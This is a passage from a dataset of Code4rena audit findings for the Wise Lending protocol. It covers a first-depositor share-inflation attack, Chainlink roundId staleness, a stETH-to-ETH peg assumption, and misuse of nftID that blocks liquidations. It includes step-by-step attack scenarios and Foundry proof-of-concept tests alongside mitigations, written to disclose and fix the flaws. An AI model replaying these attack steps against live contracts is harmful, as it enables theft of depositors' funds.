      "summary": "\nThe bug report describes an issue where users are able to withdraw uncollateralized deposits even when their position is in liquidation mode. This is due to a discrepancy in the code where the value of the collateral is calculated differently when withdrawing deposits compared to when doing liquidations. This allows users to withdraw deposits that they should not be able to, potentially causing financial losses for the protocol. The recommended mitigation is to change the code to use the same calculation for both withdrawals and liquidations, ensuring that positions in liquidation mode cannot withdraw uncollateralized deposits. The team has acknowledged the issue and implemented the recommended mitigation. ",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/260",
      "tags": [
        "Bypass limit",
        "Liquidation"
      ],
      "finders": [
        "0xStalin"
      ]
    },
    {
      "id": "32092",
      "title": "[M-03] First depositor inflation attack in `PendlePowerFarmToken`",
      "impact": "MEDIUM",
      "content": "\nIn certain scenarios, shares of a subsequent depositor can be heavily reduced, losing a large amount of his deposited funds, the attacker can increase the right side of the `previewMintShares` by adding rewards for compounding.\n\nThat way victim can lose `6e17` of his assets for a deposit of `1e18`.\n\n### Proof of Concept\n\nLet’s see how a first user, can grief a subsequent deposit and reduce his shares from the desired `1:1` ratio to `1:0000000000000005`.\n\nFirst, he needs to choose `PowerFarmToken` with no previous deposits.\n\n1. He calls `depositExactAmount` with 2 wei which will also call `syncSupply` `→` `_updateRewards` which is a key moment of the attack. This will make it possible `PowerFarmController::exchangeRewardsForCompoundingWithIncentive` to be called when performing the donation.\n2. With 2 wei user will mint 2 shares, so `totalSupply = 3` and `underlyingLpAssetsCurrent = 3`.\n3. Then, the victim comes and tries to deposit `1e18` of assets, but is front ran by the first user calling `PowerFarmController::exchangeRewardsForCompoundingWithIncentive` `→` `addCompoundRewards` with `999999999999999996` that will increase the `totalLpAssetsToDistribute`, which is added to `underlyingLpAssetsCurrent` in the `_syncSupply` function, called from the modifier before the main functions.\n\nThe attacker does not lose his deposit of `1e18` because it is converted to `rewardTokens` and sent to him, basically making the inflation free.\n\n[PendlePowerFarmController.sol#L53-L111](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L53-L111)\n\n```solidity\nfunction exchangeRewardsForCompoundingWithIncentive(\n      address _pendleMarket,\n      address _rewardToken,\n      uint256 _rewardAmount\n  ) external syncSupply(_pendleMarket) returns (uint256) {\n      CompoundStruct memory childInfo = pendleChildCompoundInfo[_pendleMarket];\n\n      uint256 index = _findIndex(childInfo.rewardTokens, _rewardToken);\n\n      if (childInfo.reservedForCompound[index] < _rewardAmount) {\n          revert NotEnoughCompound();\n      }\n\n      uint256 sendingAmount = _getAmountToSend(_pendleMarket, _getTokensInETH(_rewardToken, _rewardAmount));\n\n      childInfo.reservedForCompound[index] -= _rewardAmount;\n      pendleChildCompoundInfo[_pendleMarket] = childInfo;\n\n      _safeTransferFrom(_pendleMarket, msg.sender, address(this), sendingAmount);\n\n      IPendlePowerFarmToken(pendleChildAddress[_pendleMarket]).addCompoundRewards(sendingAmount);//@audit inflate\n\n      _safeTransfer(childInfo.rewardTokens[index], msg.sender, _rewardAmount);//@audit receive back + incentive\n\n      emit ExchangeRewardsForCompounding(_pendleMarket, _rewardToken, _rewardAmount, sendingAmount);\n\n      return sendingAmount;\n  }\n```\n\nAfter that, `totalSupply = 3`, `underlyingLpAssetsCurrent = 1e18 - 1`. The victim transaction is then executed:\n\n[PendlePowerFarmToken.sol#L452-L463](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L452-L463)\n\n```solidity\nfunction previewMintShares(uint256 _underlyingAssetAmount, uint256 _underlyingLpAssetsCurrent)\n        public\n        view\n        returns (uint256)\n    {\n        return _underlyingAssetAmount * totalSupply() / _underlyingLpAssetsCurrent;\n        // 1e18 * 3 / 1e18 - 1 = 2 \n    }\n```\n\nBoth attacker and victim have 1 share, because of the fee that is taken in the deposit function.\n\nAfter victim deposit: `totalSupply: 5`, `underlyingLpAssetsCurrent = 2e18 - 1`. Then, the victim tries to withdraw all his shares `- 1` (1 was taken as a fee on deposit).\n\n[PendlePowerFarmToken.sol#L465-L476](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L465-L476)\n\n```solidity\nfunction previewAmountWithdrawShares(uint256 _shares, uint256 _underlyingLpAssetsCurrent)\n        public\n        view\n        returns (uint256)\n    {\n        return _shares * _underlyingLpAssetsCurrent / totalSupply();\n\t        //1 * (2e18 - 1) / 5 = 399999999999999999 (0.3e18)\n    }\n```\n\nUser has lost `1e18 - 0.3e18 = 0.6e18` tokens.\n\n### Recommended Mitigation Steps\n\nSince there will be many `PowerFarmTokens` deployed, there is no way for team to perform the first deposit for all of them. Possible mitigation will be to have minimum deposit amount for the first depositor in the `PendlePowerToken`, which will increase the cost of the attack exponentially. There will not be enough reward tokens making the `exchangeRewardsForCompoundingWithIncentive` revert, due to insufficient amount. Or, could mint proper amount of tokens in the `initialize` function.\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/271#issuecomment-2032169778):**\n > > Since there will be many `PowerFarmTokens` deployed, there is no way for team to perform the first deposit for all of them.\n> \n> I think this assumption is wrong here, team deploys each token and farm by admin - one by one, and each time a new token/farm is created, team can perform first deposit or necessary step. It is not a public function to create these that team cannot handle something like that or to say \"there is no way to perform the first deposit for all of them\". That's just blown off and far fetched.\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/271#issuecomment-2090382531):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n>\n> Additional notes: before any farm is publicly available, admin creating farms can ensure no further supplier to the farm would experience any loss due to described far-fetched scenario in this \"finding\". \n***\n\n",
      "summary": "\nThe bug report discusses a scenario where an attacker can heavily reduce the shares of a subsequent depositor, causing them to lose a large amount of their deposited funds. This can be done by manipulating a specific function in the code and taking advantage of a key moment in the attack. The report includes a proof of concept and recommended mitigation steps, including adding a minimum deposit amount for the first depositor or minting the proper amount of tokens in the initialization function. The team has already implemented a fix for this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/271",
      "tags": [],
      "finders": [
        "SBSecurity",
        "0xCiphky"
      ]
    },
    {
      "id": "32091",
      "title": "[M-02] Chainlink Oracles may return stale prices or may be unusable when aggregator `roundId` is less than 50",
      "impact": "MEDIUM",
      "content": "\n`WiseLending` calibrates Oracles to get a heartbeat which it uses for checking the staleness of prices returned from the Oracle.\n\nTo calibrate, it fetches between 3-50 inclusive historical prices and picks the second largest update time among those prices. It calls `_getIterationCount()` to know the number of historical prices it'll use. If the current `_latestAggregatorRoundId` is less than 50 (`MAX_ROUND_COUNT`) it uses `_latestAggregatorRoundId` else it uses 50.\n\n[OracleHelper.sol#L665-L667](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L665-L667)\n\n            res = _latestAggregatorRoundId < MAX_ROUND_COUNT\n                ? _latestAggregatorRoundId\n                : MAX_ROUND_COUNT;\n\nThe issue with the snippet above is that `_latestAggregatorRoundId` will always be greater than 50 so the number of historical prices it uses will always be 50.\n\nIt's always greater than 50 because it is fetched from the aggregator's proxy contract. The `roundId`s returned from the proxy are a combination of the current aggregator's `roundId` and `phaseId`. Check [Chainlink docs](https://docs.chain.link/data-feeds/historical-data#roundid-in-proxy) for more info. `getLatestRoundId()` returns the `roundId`.\n\n[OracleHelper.sol#L708-L715](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L708-L715)\n\n```solidity\n        (\n            roundId\n            ,\n            ,\n            ,\n            ,\n        ) = priceFeed[_tokenAddress].latestRoundData();\n```\n\nThe `roundId` returned is used in the `_recalibratePreview()` function below to get previous `roundIds`. The `iterationCount` as we already mentioned will always be 50.\n\n[OracleHelper.sol#L620C1-L630C15](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L620C1-L630C15)\n\n            uint80 i = 1;\n            uint256 currentDiff;\n            uint256 currentBiggest;\n            uint256 currentSecondBiggest;\n\n     ❌      while (i < iterationCount) {\n\n                uint256 currentTimestamp = _getRoundTimestamp(\n                    _tokenAddress,\n     ❌              latestRoundId - i\n                );\n\nThe problem with the above call is that the argument, `latestRoundId-1` above may not have valid data for some rounds. So calls to the Chainlink Oracle for those rounds will revert.\n\nThis may occur because of the way proxy `roundIds` work.\n\nExample:\n\n- If the proxy returns 0x40000000000000010 as `roundId`.\n- The `phaseId` is 4 (`roundId` `>> 64`).\n- The aggregator `roundId` is 16 (uint64(`roundId`)).\n- After 16 iterations in `_recalibratePreview()`, the `latestRoundId` will have a value of `0x40000000000000000`. When the price feed is called, with this `roundId`, it will revert because it does not exist.\n\nCheck [Chainlink docs](https://docs.chain.link/data-feeds/historical-data#roundid-in-proxy) for more info.\n\nThus, if the aggregator `roundId` derived from the proxy `roundId` is less than 50, `_recalibratePreview()` will revert. The caller will have to wait until it is greater than 50.\n\n### Impact\n\n1. For new price feeds, OracleHub won't be able to set a heartbeat until the aggregator `roundId` is greater than 50. So the new price feed would be unusable for that period.\n2. For price feeds that already have a heartbeat, they won't be able to recalibrate during the period the aggregator `roundId` is less than 50. Which may allow the price feed return stale prices.\n\nIn both cases above the max amount of time user can wait for is 50x the official Chainlink heartbeat for the price feed, i.e. `price feed heartbeat * 50`.\n\nFor the BTC/ETH price feed this would be 50 days (`24 hours * 50`).\n\n### Recommended Mitigation Steps\n\nConsider deriving the aggregator `roundId` from the proxy `roundId` and using that instead of the proxy `roundId`.\n\n[OracleHelper.sol#L665-L667](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L665-L667)\n\n```solidity\n-       res = _latestAggregatorRoundId < MAX_ROUND_COUNT\n-           ? _latestAggregatorRoundId\n+       res = uint64(_latestAggregatorRoundId) < MAX_ROUND_COUNT\n+           ? uint64(_latestAggregatorRoundId)\n            : MAX_ROUND_COUNT;\n```\n\n**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276#issuecomment-2009118941):**\n > I don't understand the recommended mitigation steps. Its just typecasting uint64 to a uint80.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276#issuecomment-2021130680):**\n > Referring to [this](https://docs.chain.link/data-feeds/historical-data#roundid-in-proxy), it is clear the `roundId` needs to be trimmed to uint64. \n\n**[0xStalin (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276#issuecomment-2024116863):**\n > @Trust - I was checking and came to the realization that the [Chainlink Documentation](https://docs.chain.link/data-feeds/historical-data#historical-rounds) only explains how the proxy queries the `getRoundData` on the Aggregator. \n >\n > However, all this logic is implemented on the Proxy itself, the [`AggregatorProxy.getRoundData()`](https://github.com/smartcontractkit/chainlink/blob/master/contracts/src/v0.7/dev/AggregatorProxy.sol#L135-L153) is on charge of trimming the `roundId` down to `uint64` before querying the aggregator, but the proxy itself receives the `roundId` as an `uint80`. Thus, [the WiseOracle contract is correctly](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L688-L690) integrated with the Chainlink contract. All the required logic to query the data from the aggregator is contained within the chainlink proxy, any contract interacting with the proxy doesn't need to trim the received `roundId`.\n> \n> Based on the Chainlink contracts and the way how WiseOracle queries the `getRoundData()`, I think there is not any issue at all. The integration looks perfectly fine, and there is no need to implement any changes. If the `roundId` were to be trimmed to uint64, it would disrupt the queries and it would be querying a total different values; therefore, this report looks to be invalid.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276#issuecomment-2024131294):**\n > I believe the root cause of the issue is correct. It is not safe to use `latestRoundId - i` in calculations, as the `latestRoundId` is crafted of a `phaseID` and a uint64 counter. By decreasing by a flat amount, we could find ourselves querying for an incorrect `phaseID`. Essentially, it is a logical overflow not detected because it occurs in internal data of a larger data type (uint80).\n\n**[0xStalin (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276#issuecomment-2024275828):**\n > I see, then the root cause seems to be correct, but is the recommendation incomplete? If so, what would it be the correct way to mitigate this issue? \n> \n> At this point, I'm not arguing the validity of the report, but rather want to understand what needs to be done to fully mitigate the root cause of this issue.\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276#issuecomment-2082905287):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "\nThe report discusses an issue with the WiseLending contract, specifically with its use of Oracles. The contract uses a process called calibration to check the accuracy of prices returned by the Oracle. However, there is a problem with the code that determines the number of historical prices to use in this calibration process. The code always sets the number to 50, even if there are fewer prices available. This is because the code is using a value called `_latestAggregatorRoundId` which is always greater than 50 due to the way it is fetched from the aggregator's proxy contract. This can cause issues when trying to retrieve data for certain rounds, resulting in errors or stale prices. The report suggests a solution to mitigate this issue by using a different value in the code. The team has since implemented the recommended solution to address the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276",
      "tags": [],
      "finders": [
        "nonseodion"
      ]
    },
    {
      "id": "32090",
      "title": "[M-01] Exiting a farm on mainnet assumes a peg of `1:1`  when swapping stETH for ETH",
      "impact": "MEDIUM",
      "content": "\nWhen stETH depegs from ETH, the swaps on Curve will revert due to requesting a higher `amountOut` than what the curves pool will give.\n\n### Proof of Concept\n\nWhen exiting a farm on mainnet, the requested `tokensOut` is set as `stETH` for redeeming the SY tokens on the `PENDLE_SY` contract. Once the `PowerFarm` has on its balance the `stETH` tokens, [it does a swap from stETH to ETH using the Curves protocol.](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L293-L308)\n\nThe problem is that the implementation is assuming a peg of `1 ETH ~= 1 stETH`. Even though both tokens have a tendency to keep the peg, this hasn't been always the case as it can be seen [in this dashboard](https://dune.com/LidoAnalytical/Curve-ETHstETH). There have been many episodes of market volatility that affected the price of stETH, notably the one in last June when stETH traded at `~0.93` ETH.\n\n[When computing the `_minOutAmount`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L194-L199), the `PowerFarm` calculates the `ethValue` of the received stETH tokens by requesting the price of the `WETH` asset, and then it applies the `reverAllowedSpread` to finally determine the `_minOutAmount` of ETH tokens that will be accepted from the swap on Curves.\n\nThe WETH price is pegged `1:1` to ETH, 1 WETH will always be 1 ETH, but, using the price of WETH to determine the `minOutAmount` is problematic, because, as seen in the dashboard, historically, `1 stETH has deppeged from 1:1 from ETH`.\n\nExample: Assume a user sets a slippage of 1%. If stETH were to depeg to 0.95 per ETH, when swapping it would try to make sure that the user received at least 0.99 ETH. Whenever trying to swap it will revert because curves can't give the requested `minOutAmount` of ETH tokens, it could give at most 0.95 ETH per stETH.\n\n```\nfunction _logicClosePosition(\n    ...\n)\n    private\n{\n    ...\n\n    //@audit-info => When exiting a farm on mainnet, the `tokenOut` is set to be `stETH`\n    address tokenOut = block.chainid == 1\n        ? ST_ETH_ADDRESS\n        : ENTRY_ASSET;\n\n    ...\n\n    uint256 ethAmount = _getEthBack(\n        tokenOutAmount,\n        _getTokensInETH(\n            //@audit-info => When exiting a farm on mainnet, the price of the `tokenOut` is requested as if it were the price of `WETH`\n            //@audit-issue => Here is where the code assumes a peg of `1 stETH to be 1 ETH`\n            block.chainid == 1\n                ? WETH_ADDRESS\n                : ENTRY_ASSET,\n            tokenOutAmount\n        )\n            * reverseAllowedSpread\n            / PRECISION_FACTOR_E18\n    );\n\n    ...\n}\n\nfunction _getEthBack(\n    uint256 _swapAmount,\n    uint256 _minOutAmount\n)\n    internal\n    returns (uint256)\n{\n    if (block.chainid == ETH_CHAIN_ID) {\n        //@audit-info => Does a swap of stETH for ETH on the Curves exchange\n        return _swapStETHintoETH(\n            _swapAmount,\n            _minOutAmount\n        );\n    }\n\n    ...\n}\n\nfunction _swapStETHintoETH(\n    uint256 _swapAmount,\n    uint256 _minOutAmount\n)\n    internal\n    returns (uint256)\n{\n    return CURVE.exchange(\n        {\n            fromIndex: 1,\n            toIndex: 0,\n            exactAmountFrom: _swapAmount,\n            //@audit-info => minimum amount of ETH that the PowerFarm will accept for swapping `exactAmountFrom` of `stETH` tokens!\n            minReceiveAmount: _minOutAmount\n        }\n    );\n}\n\n```\n\n### Tools Used\n\nReferenced [H-06 finding on Asymmetry Finance Solodit audit](https://solodit.xyz/issues/h-06-wsteth-derivative-assumes-a-11-peg-of-steth-to-eth-code4rena-asymmetry-finance-asymmetry-contest-git) and Asymmetry's C4 mitigation review [here](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/13) and [here](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/40).\n\n### Recommended Mitigation Steps\n\nThe recommendation would be to implement a mitigation similar to the one implemented on the referenced issues.\nBasically, fetch the current price of `stETH` from a Chainlink Oracle and multiply the `minOutAmount` by the current price of `stETH`. In this way, the `minOutAmount` that is sent to the Curves exchange will now be within the correct limits based on the current price of stETH.\n\nAlso, make sure to multiply the `ethValueBefore` by the current price of stETH (only when exiting farms on mainnet). In this way, both amounts, `ethValueAfter` and `ethValueBefore` will be computed based on the current price of stETH, allowing the slippage to validate that no `ethValue` was lost during the process of removing liquidity from pendle, redeeming the sy tokens and swapping on curves. In the end, both, `ethValueAfter` and `ethValueBefore` will represent the `ethValue` based on the stETH price.\n\n### Assessed type\n\nContext\n\n**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/304#issuecomment-2006301592):**\n > Since we have `ethValueBefore` and after we could also set it to `0` and no harm done, thus invalid.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/304#issuecomment-2021072307):**\n > @vonMangoldt - Would need additional description for the issue described is not actually effective, as from my analysis I can't find a counter-example.\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/304#issuecomment-2090371585):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n>\n>Additionally, the team decided to use `PendleRouter` ([here](https://github.com/pendle-finance/pendle-core/blob/master/contracts/core/PendleRouter.sol)) instead of `Curve` moving forward during farm exit.\n\n***\n\n",
      "summary": "\n\nThis bug report discusses an issue with the stETH token on the Curve protocol. When stETH loses its peg with ETH, the swaps on Curve will fail because the code assumes a peg of 1:1 between stETH and ETH. This has been observed in the past, causing problems with the minimum amount of ETH that can be received from the swap. The recommended solution is to use the current price of stETH from a Chainlink Oracle to determine the minimum amount of ETH for the swap. The team has also decided to use PendleRouter instead of Curve for future farm exits.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/304",
      "tags": [],
      "finders": [
        "0xStalin"
      ]
    },
    {
      "id": "32089",
      "title": "[H-05] Wrong use of `nftID` to check if a `PowerFarm` position is an Aave position",
      "impact": "HIGH",
      "content": "\nWhen a `PowerFarm` position is created its `keyId` is used as a key in the `isAave` mapping to indicate if it is an Aave position or not. The `keyId` is the index of the Power Farm NFT linked with the position.\n\n[PendlePowerManager.sol#L129-L130](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerManager.sol#L129C1-L130C1)\n\n```solidity\n        isAave[keyId] = _isAave;\n```\n\nThe `keyId` is also linked with another `nftId`. This other `nftId` is used to hold the `keyId`s Power Farm position in the `WiseLending` contract. They are linked together in the `farmingKeys` mapping of the `MinterReserver` contract.\n\n[MinterReserver.sol#L88C1-L91C46](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PowerFarmNFTs/MinterReserver.sol#L88C1-L91C46)\n\n```solidity\n        uint256 keyId = _getNextReserveKey();\n\n        reservedKeys[_userAddress] = keyId;\n        farmingKeys[keyId] = _wiseLendingNFT;\n```\n\nThe issue is the check if a position is an Aave position is done using the `WiseLending` `nftId` instead of the Power Farm's `keyId`. This occurs five times in the code:\n\nIt is used in `getLiveDebtRatio()` to know the pool token borrowed so the `borrowShares` can be retrieved.\n\n[PendlePowerFarm.sol#L64-L70](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarm.sol#L64-L70)\n\n```solidity\n        uint256 borrowShares = isAave[_nftId]\n            ? _getPositionBorrowSharesAave(\n                _nftId\n            )\n            : _getPositionBorrowShares(\n                _nftId\n        );\n```\n\nIt is used in `_manuallyPaybackShares()` to know the pool token to pay back.\n\n[PendlePowerFarm.sol#L127-L129](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarm.sol#L127-L129)\n\n```solidity\n        if (isAave[_nftId] == true) {\n            poolAddress = AAVE_WETH_ADDRESS;\n        }\n```\n\nIt is used in `checkDebtRatio()` to know the pool token borrowed so the `borrowShares` can be retrieved.\n\n[PendlePowerFarmMathLogic.sol#L396-L402](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmMathLogic.sol#L396-L402)\n\n```solidity\n   ❌    uint256 borrowShares = isAave[_nftId]\n            ? _getPositionBorrowSharesAave(\n                _nftId\n            )\n            : _getPositionBorrowShares(\n                _nftId\n        );\n```\n\nIt is used in `_coreLiquidation()` to select a token to payback and to know the pool token borrowed so the `borrowShares` can be retrieved.\n\n[PendlePowerFarmLeverageLogic.sol#L575-L590](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L575-L590)\n\n```solidity\n   ❌    address paybackToken = isAave[_nftId] == true\n            ? AAVE_WETH_ADDRESS\n            : WETH_ADDRESS;\n\n        paybackAmount = WISE_LENDING.paybackAmount(\n            paybackToken,\n            _shareAmountToPay\n        );\n\n   ❌    uint256 cutoffShares = isAave[_nftId] == true\n            ? _getPositionBorrowSharesAave(_nftId)\n                * FIVTY_PERCENT\n                / PRECISION_FACTOR_E18\n            : _getPositionBorrowShares(_nftId)\n                * FIVTY_PERCENT\n                / PRECISION_FACTOR_E18;\n```\n\nThese have the following effects:\n\n- For `getLiveDebtRatio()`, users would get zero when they try to retrieve their debt ratio.\n- For `_manuallyPaybackShares()` users won't be able to pay back their shares manually from the `PowerFarm` contract since it'll fetch zero shares as borrow shares.\n- The last two instances are used in liquidation and allow a malicious user to have a position that can't be liquidated even though it is eligible for liquidation. The malicious user can:\n    1. Create an Aave `PowerFarm` position.\n    2. The position becomes eligible for liquidation after some price changes.\n    3. Liquidators cannot liquidate the position because the call to `_coreLiquidation` first calls `checkDebtRatio()` which uses the wrong `borrowShares` to calculate the debt ratio and returns true. Thus, causing a revert.\n\n[PendlePowerFarmLeverageLogic.sol#L571C1-L574C1](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L571C1-L574C1)\n\n```solidity\n        if (_checkDebtRatio(_nftId) == true) {\n            revert DebtRatioTooLow();\n        }\n```\n\n### Impact\n\n1. Malicious users can open positions that can't get liquidated.\n2. Users can't pay back manually when it is an Aave position.\n3. `getLiveDebtRatio()` returns zero always when it is an Aave position.\n\n### Proof of Concept\n\nThere are 3 tests below and they can all be run in [PendlePowerFarmControllerBase.t.sol](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmControllerBase.t.sol).\n\n- `testAaveGetLiveDebtRatio()` shows that `getLiveDebtRatio()` returns zero.\n- `testAaveManuallyPayback()` shows that borrowed tokens can't be paid back using `manuallyPaybackShares()`.\n- `testCannotLiquidate()` shows that Aave positions cannot be liquidated.\n\n```solidity\n    function testAaveGetLiveDebtRatio() public cheatSetup(true){\n        _prepareAave();\n        uint256 keyID = powerFarmManagerInstance.enterFarm(\n            true,\n            1 ether,\n            15 ether,\n            entrySpread\n        );\n\n        uint nftId = powerFarmManagerInstance.farmingKeys(keyID);\n        // gets borrow shares of weth instead of aeth\n        uint ratio = powerFarmManagerInstance.getLiveDebtRatio(nftId);\n        assertEq(ratio, 0);\n    }\n\n    function testAaveManuallyPayback() public cheatSetup(true){\n        _prepareAave();\n        uint256 keyID = powerFarmManagerInstance.enterFarm(\n            true,\n            1 ether,\n            15 ether,\n            entrySpread\n        );\n\n        uint nftId = powerFarmManagerInstance.farmingKeys(keyID);\n        uint borrowShares = wiseLendingInstance.getPositionBorrowShares(nftId, AWETH);\n        // tries to payback weth instead of aweth and reverts with an arithmetic underflow\n        // since the position has 0 weth borrow shares\n        vm.expectRevert();\n        powerFarmManagerInstance.manuallyPaybackShares(keyID, borrowShares);\n    }\n    \n    error DebtRatioTooLow();\n    function testCannotLiquidate() public cheatSetup(true){\n        _prepareAave();\n        uint256 keyID = powerFarmManagerInstance.enterFarm(\n            true,\n            1 ether,\n            15 ether,\n            entrySpread\n        );\n\n        // increase collateral factors to make position eligible for liquidation\n        wiseLendingInstance.setPoolParameters(AWETH, 99e16, type(uint256).max); // increasw Wiselending coll factor\n        vm.store(address(powerFarmManagerInstance), bytes32(uint(2)), bytes32(uint(99e16))); //increasw PowerFarm coll factor\n        assertEq(powerFarmManagerInstance.collateralFactor(), 99e16);\n\n        uint nftId = powerFarmManagerInstance.farmingKeys(keyID);\n        uint borrowShares = wiseLendingInstance.getPositionBorrowShares(nftId, AWETH);\n        // will revert if it can't be liquidated\n        wiseSecurityInstance.checksLiquidation(nftId, AWETH, borrowShares);\n\n        uint nftIdLiquidator = positionNftsInstance.mintPosition();\n\n        vm.expectRevert(DebtRatioTooLow.selector);\n        powerFarmManagerInstance.liquidatePartiallyFromToken(nftId, nftIdLiquidator, borrowShares );\n    }\n```\n\n### Recommended Mitigation Steps\n\nConsider checking if a position is an Aave position using the `keyId` of the position.\n\n[PendlePowerFarm.sol#L64-L70](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarm.sol#L64-L70)\n\n```solidity\n-       uint256 borrowShares = isAave[_nftId]\n+       uint256 borrowShares = isAave[keyId]\n            ? _getPositionBorrowSharesAave(\n                _nftId\n            )\n            : _getPositionBorrowShares(\n                _nftId\n        );\n```\n\n[PendlePowerFarm.sol#L127-L129](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarm.sol#L127-L129)\n\n```solidity\n-       if (isAave[_nftId] == true) {\n+       if (isAave[keyId] == true) {\n            poolAddress = AAVE_WETH_ADDRESS;\n        }\n```\n\n[PendlePowerFarmMathLogic.sol#L396-L402](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmMathLogic.sol#L396-L402)\n\n```solidity\n-        uint256 borrowShares = isAave[_nftId]\n+        uint256 borrowShares = isAave[keyId]\n            ? _getPositionBorrowSharesAave(\n                _nftId\n            )\n            : _getPositionBorrowShares(\n                _nftId\n        );\n```\n\n[PendlePowerFarmLeverageLogic.sol#L575-L590](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L575-L590)\n\n```solidity\n-        address paybackToken = isAave[_nftId] == true\n+        address paybackToken = isAave[keyId] == true\n            ? AAVE_WETH_ADDRESS\n            : WETH_ADDRESS;\n\n        paybackAmount = WISE_LENDING.paybackAmount(\n            paybackToken,\n            _shareAmountToPay\n        );\n\n-       uint256 cutoffShares = isAave[_nftId] == true\n+       uint256 cutoffShares = isAave[keyId] == true\n            ? _getPositionBorrowSharesAave(_nftId)\n                * FIVTY_PERCENT\n                / PRECISION_FACTOR_E18\n            : _getPositionBorrowShares(_nftId)\n                * 